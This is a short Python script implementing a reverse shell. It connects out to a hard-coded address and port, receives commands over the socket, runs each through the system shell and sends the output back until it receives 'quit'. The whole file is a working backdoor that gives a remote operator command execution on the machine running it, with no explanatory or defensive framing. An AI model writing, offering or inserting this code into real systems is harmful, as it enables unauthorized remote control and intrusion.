# coding: utf8

import socket, subprocess

HOST = '10.0.0.101'
PORT = 50008
str1 = "[*] Connection Established!"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(str1.decode())

while 1:
    data = s.recv(1024)
    if data == "quit": break
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    s.sendall(stdout_value)

s.close()